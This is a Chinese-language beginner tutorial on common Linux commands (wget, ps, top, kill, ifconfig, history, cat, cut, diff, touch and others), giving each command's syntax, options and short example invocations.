&#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5728;&#x7EC8;&#x7AEF;&#x4E2D;&#x4E0B;&#x8F7D;&#x7F51;&#x7EDC;&#x6587;&#x4EF6;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;wget [&#x53C2;&#x6570;] &#x4E0B;&#x8F7D;&#x5730;&#x5740;&#x201D;&#x3002; wget&#x547D;&#x4EE4;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#xFF1A; 123456-b &#x540E;&#x53F0;&#x4E0B;&#x8F7D;&#x6A21;&#x5F0F;-P &#x4E0B;&#x8F7D;&#x5230;&#x6307;&#x5B9A;&#x76EE;&#x5F55;-t &#x6700;&#x5927;&#x5C1D;&#x8BD5;&#x6B21;&#x6570;-c &#x65AD;&#x70B9;&#x7EED;&#x4F20;-p &#x4E0B;&#x8F7D;&#x9875;&#x9762;&#x5185;&#x6240;&#x6709;&#x8D44;&#x6E90;&#xFF0C;&#x5305;&#x62EC;&#x56FE;&#x7247;&#x3001;&#x89C6;&#x9891;&#x7B49;-r &#x9012;&#x5F52;&#x4E0B;&#x8F7D; &#x4E0B;&#x8F7D;&#x4E00;&#x4E2A;pdf&#x6587;&#x6863;&#xFF1A;wget http://www.linuxprobe.com/docs/LinuxProbe.pdf &#x4F7F;&#x7528; wget &#x547D;&#x4EE4;&#x9012;&#x5F52;&#x4E0B;&#x8F7D; www.linuxprobe.com &#x7F51;&#x7AD9;&#x5185;&#x7684;&#x6240;&#x6709;&#x9875;&#x9762;&#x6570;&#x636E;&#x4EE5;&#x53CA;&#x6587;&#x4EF6;&#xFF0C;&#x4E0B;&#x8F7D;&#x5B8C;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x4FDD;&#x5B58;&#x5230;&#x5F53;&#x524D;&#x8DEF;&#x5F84;&#x4E0B;&#x4E00;&#x4E2A;&#x540D;&#x4E3A; www.linuxprobe.com &#x7684;&#x76EE;&#x5F55;&#x4E2D;&#x3002; wget -r -p http://www.linuxprobe.com&#xFF0C; 6, ps &#x547D;&#x4EE4; ps &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#x72B6;&#x6001;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;ps [&#x53C2;&#x6570;]&#x201D;&#x3002; ps&#x547D;&#x4EE4;&#x7684;&#x53C2;&#x6570;&#x4EE5;&#x53CA;&#x4F5C;&#x7528;&#xFF1A; 123-a &#x663E;&#x793A;&#x6240;&#x6709;&#x8FDB;&#x7A0B;&#xFF08;&#x5305;&#x62EC;&#x5176;&#x4ED6;&#x7528;&#x6237;&#x7684;&#x8FDB;&#x7A0B;&#xFF09;-u &#x7528;&#x6237;&#x4EE5;&#x53CA;&#x5176;&#x4ED6;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;-x &#x663E;&#x793A;&#x6CA1;&#x6709;&#x63A7;&#x5236;&#x7EC8;&#x7AEF;&#x7684;&#x8FDB;&#x7A0B; Linux&#x7CFB;&#x7EDF;&#x4E2D;&#x8FDB;&#x7A0B;&#x72B6;&#x6001;&#xFF1A; 12345R(&#x8FD0;&#x884C;) &#x8FDB;&#x7A0B;&#x6B63;&#x5728;&#x8FD0;&#x884C;&#x6216;&#x5728;&#x8FD0;&#x884C;&#x961F;&#x5217;&#x4E2D;&#x7B49;&#x5F85;&#x3002;S(&#x4E2D;&#x65AD;) &#x8FDB;&#x7A0B;&#x5904;&#x4E8E;&#x4F11;&#x7720;&#x4E2D;&#xFF0C;&#x5F53;&#x67D0;&#x4E2A;&#x6761;&#x4EF6;&#x5F62;&#x6210;&#x540E;&#x6216;&#x8005;&#x63A5;&#x6536;&#x5230;&#x4FE1;&#x53F7;&#x65F6;&#xFF0C;&#x5219;&#x8131;&#x79BB;&#x8BE5;&#x72B6;&#x6001;&#x3002;D(&#x4E0D;&#x53EF;&#x4E2D;&#x65AD;) &#x8FDB;&#x7A0B;&#x4E0D;&#x54CD;&#x5E94;&#x7CFB;&#x7EDF;&#x5F02;&#x6B65;&#x4FE1;&#x53F7;&#xFF0C;&#x5373;&#x4FBF;&#x7528; kill &#x547D;&#x4EE4;&#x4E5F;&#x4E0D;&#x80FD;&#x5C06;&#x5176;&#x4E2D;&#x65AD;&#x3002;Z(&#x50F5;&#x6B7B;) &#x8FDB;&#x7A0B;&#x5DF2;&#x7ECF;&#x7EC8;&#x6B62;&#xFF0C;&#x4F46;&#x8FDB;&#x7A0B;&#x63CF;&#x8FF0;&#x7B26;&#x4F9D;&#x7136;&#x5B58;&#x5728;, &#x76F4;&#x5230;&#x7236;&#x8FDB;&#x7A0B;&#x8C03;&#x7528; wait4()&#x7CFB;&#x7EDF;&#x51FD;&#x6570;&#x540E;&#x5C06;&#x8FDB;&#x7A0B;&#x91CA;&#x653E;&#x3002;T(&#x505C;&#x6B62;) &#x8FDB;&#x7A0B;&#x6536;&#x5230;&#x505C;&#x6B62;&#x4FE1;&#x53F7;&#x540E;&#x505C;&#x6B62;&#x8FD0;&#x884C;&#x3002; 7, top &#x547D;&#x4EE4; top &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x52A8;&#x6001;&#x5730;&#x76D1;&#x89C6;&#x8FDB;&#x7A0B;&#x6D3B;&#x52A8;&#x4E0E;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x5176;&#x683C;&#x5F0F;&#x4E3A; top&#x3002; &#x7B2C; 1 &#x884C;&#xFF1A;&#x7CFB;&#x7EDF;&#x65F6;&#x95F4;&#x3001;&#x8FD0;&#x884C;&#x65F6;&#x95F4;&#x3001;&#x767B;&#x5F55;&#x7EC8;&#x7AEF;&#x6570;&#x3001;&#x7CFB;&#x7EDF;&#x8D1F;&#x8F7D;&#xFF08;&#x4E09;&#x4E2A;&#x6570;&#x503C;&#x5206;&#x522B;&#x4E3A; 1 &#x5206;&#x949F;&#x3001;5&#x5206;&#x949F;&#x3001;15 &#x5206;&#x949F;&#x5185;&#x7684;&#x5E73;&#x5747;&#x503C;&#xFF0C;&#x6570;&#x503C;&#x8D8A;&#x5C0F;&#x610F;&#x5473;&#x7740;&#x8D1F;&#x8F7D;&#x8D8A;&#x4F4E;&#xFF09;&#x3002; &#x7B2C; 2 &#x884C;&#xFF1A;&#x8FDB;&#x7A0B;&#x603B;&#x6570;&#x3001;&#x8FD0;&#x884C;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x7761;&#x7720;&#x4E2D;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x505C;&#x6B62;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3001;&#x50F5;&#x6B7B;&#x7684;&#x8FDB;&#x7A0B;&#x6570;&#x3002; &#x7B2C; 3 &#x884C;&#xFF1A;&#x7528;&#x6237;&#x5360;&#x7528;&#x8D44;&#x6E90;&#x767E;&#x5206;&#x6BD4;&#x3001;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x5360;&#x7528;&#x8D44;&#x6E90;&#x767E;&#x5206;&#x6BD4;&#x3001;&#x6539;&#x53D8;&#x8FC7;&#x4F18;&#x5148;&#x7EA7;&#x7684;&#x8FDB;&#x7A0B;&#x8D44;&#x6E90;&#x767E;&#x5206;&#x6BD4;&#x3001;&#x7A7A;&#x95F2;&#x7684;&#x8D44;&#x6E90;&#x767E;&#x5206;&#x6BD4;&#x7B49;&#x3002; &#x7B2C; 4 &#x884C;&#xFF1A;&#x7269;&#x7406;&#x5185;&#x5B58;&#x603B;&#x91CF;&#x3001;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x91CF;&#x3001;&#x5185;&#x5B58;&#x7A7A;&#x95F2;&#x91CF;&#x3001;&#x4F5C;&#x4E3A;&#x5185;&#x6838;&#x7F13;&#x5B58;&#x7684;&#x5185;&#x5B58;&#x91CF;&#x3002; &#x7B2C; 5 &#x884C;&#xFF1A;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x603B;&#x91CF;&#x3001;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x4F7F;&#x7528;&#x91CF;&#x3001;&#x865A;&#x62DF;&#x5185;&#x5B58;&#x7A7A;&#x95F2;&#x91CF;&#x3001;&#x5DF2;&#x88AB;&#x63D0;&#x524D;&#x52A0;&#x8F7D;&#x7684;&#x5185;&#x5B58;&#x91CF;&#x3002; 8, pidof &#x547D;&#x4EE4; pidof &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x8BE2;&#x67D0;&#x4E2A;&#x6307;&#x5B9A;&#x670D;&#x52A1;&#x8FDB;&#x7A0B;&#x7684; PID &#x503C;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;pidof [&#x53C2;&#x6570;] [&#x670D;&#x52A1;&#x540D;&#x79F0;]&#x3002; 9, kill &#x547D;&#x4EE4; kill &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x7EC8;&#x6B62;&#x67D0;&#x4E2A;&#x6307;&#x5B9A; PID &#x7684;&#x670D;&#x52A1;&#x8FDB;&#x7A0B;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;kill [&#x53C2;&#x6570;] [&#x8FDB;&#x7A0B; PID]&#x3002; 10, killall &#x547D;&#x4EE4; killall &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x7EC8;&#x6B62;&#x67D0;&#x4E2A;&#x6307;&#x5B9A;&#x540D;&#x79F0;&#x7684;&#x670D;&#x52A1;&#x6240;&#x5BF9;&#x5E94;&#x7684;&#x5168;&#x90E8;&#x8FDB;&#x7A0B;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#xFF1A;killall [&#x53C2;&#x6570;] [&#x670D;&#x52A1;&#x540D;&#x79F0;]&#x3002; &#x7CFB;&#x7EDF;&#x72B6;&#x6001;&#x68C0;&#x6D4B;&#x547D;&#x4EE4; 1, ifconfig &#x547D;&#x4EE4; ifconfig &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x83B7;&#x53D6;&#x7F51;&#x5361;&#x914D;&#x7F6E;&#x4E0E;&#x7F51;&#x7EDC;&#x72B6;&#x6001;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;ifconfig [&#x7F51;&#x7EDC;&#x8BBE;&#x5907;] [&#x53C2;&#x6570;]&#x201D;&#x3002; 123456789101112131415161718192021&#x4E3B;&#x8981;&#x67E5;&#x770B;&#x7684;&#x5C31;&#x662F;&#x7F51;&#x5361;&#x540D;&#x79F0;&#x3001;inet &#x53C2;&#x6570;&#x540E;&#x9762;&#x7684; IP &#x5730;&#x5740;&#x3001;ether &#x53C2;&#x6570;&#x540E;&#x9762;&#x7684;&#x7F51;&#x5361;&#x7269;&#x7406;&#x5730;&#x5740;&#xFF08;&#x53C8;&#x79F0;&#x4E3A; MAC &#x5730;&#x5740;&#xFF09;&#xFF0C;&#x4EE5;&#x53CA; RX&#x3001;TX &#x7684;&#x63A5;&#x6536;&#x6570;&#x636E;&#x5305;&#x4E0E;&#x53D1;&#x9001;&#x6570;&#x636E;&#x5305;&#x7684;&#x4E2A;&#x6570;&#x53CA;&#x7D2F;&#x8BA1;&#x6D41;&#x91CF;eno16777728: flags=4163&lt;UP,BROADCAST,RUNNING,MULTICAST&gt; mtu 1500 ether 00:0c:29:26:b9:b3 txqueuelen 1000 (Ethernet) RX packets 45 bytes 4992 (4.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 0 bytes 0 (0.0 B) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0lo: flags=73&lt;UP,LOOPBACK,RUNNING&gt; mtu 65536 inet 127.0.0.1 netmask 255.0.0.0 inet6 ::1 prefixlen 128 scopeid 0x10&lt;host&gt; loop txqueuelen 0 (Local Loopback) RX packets 770 bytes 62348 (60.8 KiB) RX errors 0 dropped 0 overruns 0 frame 0 TX packets 770 bytes 62348 (60.8 KiB) TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0 2, uname &#x547D;&#x4EE4; uname &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x5185;&#x6838;&#x4E0E;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;uname [-a]&#x201D;&#x3002; &#x5982;&#x679C;&#x8981;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x7248;&#x672C;&#x7684;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x67E5;&#x770B; redhat-release &#x6587;&#x4EF6;&#xFF0C;&#x5176;&#x547D;&#x4EE4;&#x4EE5;&#x53CA;&#x76F8;&#x5E94;&#x7684;&#x7ED3;&#x679C;&#x5982;&#x4E0B;&#xFF1A; cat /etc/redhat-release 3, uptime &#x547D;&#x4EE4; uptime &#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7CFB;&#x7EDF;&#x7684;&#x8D1F;&#x8F7D;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; uptime&#x3002; 4, free &#x547D;&#x4EE4; free &#x7528;&#x4E8E;&#x663E;&#x793A;&#x5F53;&#x524D;&#x7CFB;&#x7EDF;&#x4E2D;&#x5185;&#x5B58;&#x7684;&#x4F7F;&#x7528;&#x91CF;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;free [-h]&#x201D;&#x3002; 5, who &#x547D;&#x4EE4; who &#x7528;&#x4E8E;&#x67E5;&#x770B;&#x5F53;&#x524D;&#x767B;&#x5165;&#x4E3B;&#x673A;&#x7684;&#x7528;&#x6237;&#x7EC8;&#x7AEF;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;who [&#x53C2;&#x6570;]&#x201D;&#x3002; 6, last &#x547D;&#x4EE4; last &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x6240;&#x6709;&#x7CFB;&#x7EDF;&#x7684;&#x767B;&#x5F55;&#x8BB0;&#x5F55;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;last [&#x53C2;&#x6570;]&#x201D;&#x3002; 7, history &#x547D;&#x4EE4; history &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x5386;&#x53F2;&#x6267;&#x884C;&#x8FC7;&#x7684;&#x547D;&#x4EE4;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;history [-c]&#x201D;&#x3002; &#x5386;&#x53F2;&#x547D;&#x4EE4;&#x4F1A;&#x88AB;&#x4FDD;&#x5B58;&#x5230;&#x7528;&#x6237;&#x5BB6;&#x76EE;&#x5F55;&#x4E2D;&#x7684;.bash_history &#x6587;&#x4EF6;&#x4E2D;&#x3002; cat ~/.bash_history &#x6E05;&#x7A7A;&#x5386;&#x53F2;&#x8BB0;&#x5F55;&#x4FE1;&#x606F;&#xFF1A; history -c 8, sosreport &#x547D;&#x4EE4; sosreport &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6536;&#x96C6;&#x7CFB;&#x7EDF;&#x914D;&#x7F6E;&#x53CA;&#x67B6;&#x6784;&#x4FE1;&#x606F;&#x5E76;&#x8F93;&#x51FA;&#x8BCA;&#x65AD;&#x6587;&#x6863;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A; sosreport&#x3002; &#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#x5207;&#x6362;&#x547D;&#x4EE4; 1, pwd &#x547D;&#x4EE4; pwd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x7528;&#x6237;&#x5F53;&#x524D;&#x6240;&#x5904;&#x7684;&#x5DE5;&#x4F5C;&#x76EE;&#x5F55;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;pwd [&#x9009;&#x9879;]&#x201D;&#x3002; 2, cd &#x547D;&#x4EE4; cd &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x5207;&#x6362;&#x5DE5;&#x4F5C;&#x8DEF;&#x5F84;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;cd [&#x76EE;&#x5F55;&#x540D;&#x79F0;]&#x201D;&#x3002; 1234cd - &#x547D;&#x4EE4;&#x56DE;&#x5230;&#x4E0A;&#x4E00;&#x6B21;&#x6240;&#x5904;&#x7684;&#x76EE;&#x5F55;cd. &#x547D;&#x4EE4;&#x8FDB;&#x5165;&#x4E0A;&#x7EA7;&#x76EE;&#x5F55;cd ~ &#x547D;&#x4EE4;&#x5207;&#x6362;&#x5230;&#x5F53;&#x524D;&#x7528;&#x6237;&#x7684;&#x5BB6;&#x76EE;&#x5F55;cd &#x8DEF;&#x5F84; 3, ls &#x547D;&#x4EE4; ls &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x663E;&#x793A;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x6587;&#x4EF6;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;ls [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; &#x4F7F;&#x7528; ls &#x547D;&#x4EE4;&#x7684;&#x201C;-a&#x201D;&#x53C2;&#x6570;&#x770B;&#x5230;&#x5168;&#x90E8;&#x6587;&#x4EF6;&#xFF08;&#x5305;&#x62EC;&#x9690;&#x85CF;&#x6587;&#x4EF6;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;&#x201C;-l&#x201D;&#x53C2;&#x6570;&#x53EF;&#x4EE5;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x7684;&#x5C5E;&#x6027;&#x3001;&#x5927;&#x5C0F;&#x7B49;&#x8BE6;&#x7EC6;&#x4FE1;&#x606F;&#x3002; ls -al &#x67E5;&#x770B;&#x76EE;&#x5F55;&#x5C5E;&#x6027;&#x4FE1;&#x606F;&#xFF0C;&#x5219;&#x9700;&#x8981;&#x989D;&#x5916;&#x6DFB;&#x52A0;&#x4E00;&#x4E2A;-d &#x53C2;&#x6570;&#x3002; ls -ld /etc &#x6587;&#x672C;&#x6587;&#x4EF6;&#x7F16;&#x8F91;&#x547D;&#x4EE4; 1, cat &#x547D;&#x4EE4; cat &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7EAF;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF08;&#x5185;&#x5BB9;&#x8F83;&#x5C11;&#x7684;&#xFF09;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;cat [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; &#x5982;&#x679C;&#x5728;&#x67E5;&#x770B;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x65F6;&#x8FD8;&#x60F3;&#x987A;&#x4FBF;&#x663E;&#x793A;&#x884C;&#x53F7;&#x7684;&#x8BDD;&#xFF0C;&#x53EF;&#x4EE5;&#x5728; cat &#x547D;&#x4EE4;&#x540E;&#x9762;&#x8FFD;&#x52A0;&#x4E00;&#x4E2A;-n &#x53C2;&#x6570; cat -n initial-setup-ks.cfg 2, more &#x547D;&#x4EE4; more &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7EAF;&#x6587;&#x672C;&#x6587;&#x4EF6;&#xFF08;&#x5185;&#x5BB9;&#x8F83;&#x591A;&#x7684;&#xFF09;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;more [&#x9009;&#x9879;]&#x6587;&#x4EF6;&#x201D;&#x3002; &#x5BF9;&#x4E8E;&#x957F;&#x7BC7;&#x7684;&#x6587;&#x672C;&#x5185;&#x5BB9;&#xFF0C;&#x63A8;&#x8350;&#x4F7F;&#x7528; more &#x547D;&#x4EE4;&#x6765;&#x67E5;&#x770B;&#x3002;more &#x547D;&#x4EE4;&#x4F1A;&#x5728;&#x6700;&#x4E0B;&#x9762;&#x4F7F;&#x7528;&#x767E;&#x5206;&#x6BD4;&#x7684;&#x5F62;&#x5F0F;&#x6765;&#x63D0;&#x793A;&#x60A8;&#x5DF2;&#x7ECF;&#x9605;&#x8BFB;&#x4E86;&#x591A;&#x5C11;&#x5185;&#x5BB9;&#x3002;&#x60A8;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x7A7A;&#x683C;&#x952E;&#x6216;&#x56DE;&#x8F66;&#x952E;&#x5411;&#x4E0B;&#x7FFB;&#x9875;&#x3002; more initial-setup-ks.cfg 3, head &#x547D;&#x4EE4; head &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7EAF;&#x6587;&#x672C;&#x6587;&#x6863;&#x7684;&#x524D; N &#x884C;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;head [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; head -n 20 initial-setup-ks.cfg 4, tail &#x547D;&#x4EE4; tail &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x7EAF;&#x6587;&#x672C;&#x6587;&#x6863;&#x7684;&#x540E; N &#x884C;&#x6216;&#x6301;&#x7EED;&#x5237;&#x65B0;&#x5185;&#x5BB9;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;tail [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; tail &#x547D;&#x4EE4;&#x6700;&#x5F3A;&#x608D;&#x7684;&#x529F;&#x80FD;&#x662F;&#x53EF;&#x4EE5;&#x6301;&#x7EED;&#x5237;&#x65B0;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x5185;&#x5BB9;&#xFF0C;&#x5F53;&#x60F3;&#x8981;&#x5B9E;&#x65F6;&#x67E5;&#x770B;&#x6700;&#x65B0;&#x65E5;&#x5FD7;&#x6587;&#x4EF6;&#x65F6;&#xFF0C;&#x8FD9;&#x7279;&#x522B;&#x6709;&#x7528;&#xFF0C;&#x6B64;&#x65F6;&#x7684;&#x547D;&#x4EE4;&#x683C;&#x5F0F;&#x4E3A;&#x201C;tail -f &#x6587;&#x4EF6;&#x540D;&#x201D;&#xFF1A; tail -f /var/log/messages 5, tr &#x547D;&#x4EE4; tr &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x66FF;&#x6362;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x4E2D;&#x7684;&#x5B57;&#x7B26;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;tr [&#x539F;&#x59CB;&#x5B57;&#x7B26;] [&#x76EE;&#x6807;&#x5B57;&#x7B26;]&#x3002; &#x53EF;&#x4EE5;&#x5148;&#x4F7F;&#x7528; cat &#x547D;&#x4EE4;&#x8BFB;&#x53D6;&#x5F85;&#x5904;&#x7406;&#x7684;&#x6587;&#x672C;&#xFF0C;&#x7136;&#x540E;&#x901A;&#x8FC7;&#x7BA1;&#x9053;&#x7B26;&#xFF08;&#x8BE6;&#x89C1;&#x7B2C; 3 &#x7AE0;&#xFF09;&#x628A;&#x8FD9;&#x4E9B;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x4F20;&#x9012;&#x7ED9; tr &#x547D;&#x4EE4;&#x8FDB;&#x884C;&#x66FF;&#x6362;&#x64CD;&#x4F5C;&#x5373;&#x53EF;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x628A;&#x67D0;&#x4E2A;&#x6587;&#x672C;&#x5185;&#x5BB9;&#x4E2D;&#x7684;&#x82F1;&#x6587;&#x5168;&#x90E8;&#x66FF;&#x6362;&#x4E3A;&#x5927;&#x5199; cat anaconda-ks.cfg | tr [a-z] [A-Z] 6, wc &#x547D;&#x4EE4; wc &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x7EDF;&#x8BA1;&#x6307;&#x5B9A;&#x6587;&#x672C;&#x7684;&#x884C;&#x6570;&#x3001;&#x5B57;&#x6570;&#x3001;&#x5B57;&#x8282;&#x6570;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;wc [&#x53C2;&#x6570;] &#x6587;&#x672C;&#x201D;&#x3002; 123-l &#x53EA;&#x663E;&#x793A;&#x884C;&#x6570;-w &#x53EA;&#x663E;&#x793A;&#x5355;&#x8BCD;&#x6570;-c &#x53EA;&#x663E;&#x793A;&#x5B57;&#x8282;&#x6570; 7, stat &#x547D;&#x4EE4; stat &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x7684;&#x5177;&#x4F53;&#x5B58;&#x50A8;&#x4FE1;&#x606F;&#x548C;&#x65F6;&#x95F4;&#x7B49;&#x4FE1;&#x606F;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;stat &#x6587;&#x4EF6;&#x540D;&#x79F0;&#x201D;&#x3002; 8, cut &#x547D;&#x4EE4; cut &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6309;&#x201C;&#x5217;&#x201D;&#x63D0;&#x53D6;&#x6587;&#x672C;&#x5B57;&#x7B26;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;cut [&#x53C2;&#x6570;] &#x6587;&#x672C;&#x201D;&#x3002; &#x4F7F;&#x7528;-f &#x53C2;&#x6570;&#x6765;&#x8BBE;&#x7F6E;&#x9700;&#x8981;&#x770B;&#x7684;&#x5217;&#x6570;&#xFF0C;&#x4F7F;&#x7528;-d &#x53C2;&#x6570;&#x6765;&#x8BBE;&#x7F6E;&#x95F4;&#x9694;&#x7B26;&#x53F7;&#x3002; &#x8BFB;&#x53D6;&#x4E24;&#x884C;&#xFF1A; head -n 2 /etc/passwd &#x8BFB;&#x53D6;&#x6309;&#xFF1A;&#x95F4;&#x9694;&#x7684;&#x7B2C;&#x4E00;&#x5217;&#x6587;&#x672C;&#xFF1A;cut -d: -f1 /etc/passwd 9, diff&#x547D;&#x4EE4; diff &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x6BD4;&#x8F83;&#x591A;&#x4E2A;&#x6587;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x5DEE;&#x5F02;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;diff [&#x53C2;&#x6570;] &#x6587;&#x4EF6;&#x201D;&#x3002; &#x6765;&#x4F7F;&#x7528; diff &#x2013;brief &#x547D;&#x4EE4;&#x663E;&#x793A;&#x6BD4;&#x8F83;&#x540E;&#x7684;&#x7ED3;&#x679C;&#xFF0C;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x662F;&#x5426;&#x76F8;&#x540C;&#xFF1A; diff --brief diff_A.txt diff_B.txt &#x4F7F;&#x7528;&#x5E26;&#x6709;-c &#x53C2;&#x6570;&#x7684; diff &#x547D;&#x4EE4;&#x6765;&#x63CF;&#x8FF0;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x5177;&#x4F53;&#x7684;&#x4E0D;&#x540C;&#xFF1A; diff -c diff_A.txt diff_B.txt &#x6587;&#x4EF6;&#x76EE;&#x5F55;&#x7BA1;&#x7406;&#x547D;&#x4EE4; 1, touch &#x547D;&#x4EE4; touch &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x7A7A;&#x767D;&#x6587;&#x4EF6;&#x6216;&#x8BBE;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x65F6;&#x95F4;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;touch [&#x9009;&#x9879;] [&#x6587;&#x4EF6;]&#x3002; 123-a &#x4EC5;&#x4FEE;&#x6539;&#x201C;&#x8BFB;&#x53D6;&#x65F6;&#x95F4;&#x201D;&#xFF08;atime&#xFF09;-m &#x4EC5;&#x4FEE;&#x6539;&#x201C;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#x201D;&#xFF08;mtime&#xFF09;-d &#x540C;&#x65F6;&#x4FEE;&#x6539; atime &#x4E0E; mtime &#x5148;&#x4F7F;&#x7528; ls &#x547D;&#x4EE4;&#x67E5;&#x770B;&#x4E00;&#x4E2A;&#x6587;&#x4EF6;&#x7684;&#x4FEE;&#x6539;&#x65F6;&#x95F4;&#xFF0C;&#x7136;&#x540E;&#x4FEE;&#x6539;&#x8FD9;&#x4E2A;&#x6587;&#x4EF6;&#xFF0C;&#x6700;&#x540E;&#x518D;&#x901A;&#x8FC7; touch&#x547D;&#x4EE4;&#x628A;&#x4FEE;&#x6539;&#x540E;&#x7684;&#x6587;&#x4EF6;&#x65F6;&#x95F4;&#x8BBE;&#x7F6E;&#x6210;&#x4FEE;&#x6539;&#x4E4B;&#x524D;&#x7684;&#x65F6;&#x95F4;&#x3002; 12345ls -l wordpress.txtecho &quot;This is a test!!!&quot; &gt;&gt; wordpress.txtls -l wordpress.txttouch -d &quot;2019-2-25 20:06&quot; wordpress.txtls -l wordpress.txt 2, mkdir &#x547D;&#x4EE4; mkdir &#x547D;&#x4EE4;&#x7528;&#x4E8E;&#x521B;&#x5EFA;&#x7A7A;&#x767D;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x683C;&#x5F0F;&#x4E3A;&#x201C;mkdir [&#x9009;&#x9879;] &#x76EE;&#x5F55;&#x201D; 